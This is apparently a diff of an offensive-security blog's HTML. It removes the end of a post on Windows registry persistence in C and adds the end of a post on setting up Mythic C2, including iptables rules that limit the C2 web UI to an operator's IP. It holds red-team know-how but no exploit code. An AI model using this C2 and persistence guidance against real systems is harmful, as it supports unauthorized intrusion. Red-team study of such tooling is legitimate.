-    <figcaption class="caption">powershell.exe with flushed settings is spawned.</figcaption>
+    <img src="../../attachments/pasted-image-20250723204607.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>This time the payload is executed after a slight delay. I am not really sure why it happens like that, I can only think for now that it is due to initializing the users environment variables as well as the process of loading its desktop. If you have more insights about this, drop your thoughts on the <a href="https://discord.gg/bgSpdheEgu">Red Teaming Army Discord Server</a>.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>The POC is already present inside the <a href="https://github.com/lsecqt/OffensiveCpp/blob/main/Techniques/Persistence/user_persistence_run.c">OffensiveCpp</a> repo.</p>
-        </div>
-    </div>
-</div>
-<doc-anchor-target id="conclusion">
+<doc-anchor-target id="bonus---iptables-for-multiplayer-mode">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#conclusion">#</doc-anchor-trigger>
-        <span>Conclusion</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bonus---iptables-for-multiplayer-mode">#</doc-anchor-trigger>
+        <span>Bonus - IPTables for Multiplayer Mode</span>
     </h2>
 </doc-anchor-target>
-<p>In conclusion, this blog post has just scratched the surface of establishing persistence in Windows systems. It is important to understand the Windows Registry deeper, and what key to manipulate for each action. Through the power of C programming, we&#x27;ve uncovered how simple yet powerful techniques can be employed to manipulate registry keys, ensuring that our desired configurations persist across system reboots and updates.</p>
-<p>As mentioned above, the evasiveness depends on large scale of factors. From the implant itself to the whole persistence establishment process. This blog does not aim to show you how to bypass an EDR, but rather to lay out some fundamentals about persistence and C programming.</p>
-<p>Hope you enjoyed it and learned something new! If that is the case feel free to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>, by doing so you support my work and also you get access to my private tooling and repos. Feel free to adopt, review and modify the <a href="https://github.com/lsecqt/OffensiveCpp">OffensiveCpp</a> project.</p>
+<p>If you want to use Mythic C2 with your team, ideally you do not want to expose the UI itself. This snippet will help:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">iptables -I DOCKER 1 -p tcp -s &quot;Operator IP&quot; --dport 7443 -j ACCEPT
+iptables -A DOCKER -j DROP</code></pre>
+</doc-codeblock></div>
+<p>This will allow specific IP (<code v-pre>Operator IP</code>) to connect to the Mythic&#x27;s UI and drop all other requests.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+<p>Dropping access to the UI do not mean that the Agent access to the C2 profile will also drop! This is another independent service!</p>
+        </div>
+    </div>
+</div>
+<p>Thank you for your time, hope this was useful.</p>
+<p>If you appreciate my work you can <a href="https://www.youtube.com/@Lsecqt">Subscribe</a> or become my <a href="https://www.patreon.com/c/Lsecqt">Patreon</a></p>
 
                                 
                                 <!-- Required only on API pages -->
@@ -684,20 +645,20 @@ int main() {
                             
                                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/leveraging-the-direct-pointer-a-stealthy-maneuver-in-evasion-tactics/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../c2/utilizing-discord-as-c2-traffic-broker/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                                <span class="block mt-1">Leveraging the Direct Pointer A Stealthy Maneuver in Evasion Tactics</span>
+                                                <span class="block mt-1">Utilizing Discord as C​2 Traffic Broker</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/staging-vs-stageless-payloads-what-is-better/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/basic-process-injection/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                                <span class="block mt-1">Staging vs Stageless payloads - Which one is Better?</span>
+                                                <span class="block mt-1">Basic Process Injection with C</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -741,6 +702,6 @@ int main() {
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Malware Development with C - Establishing Persistence", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Setting up Mythic C2", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
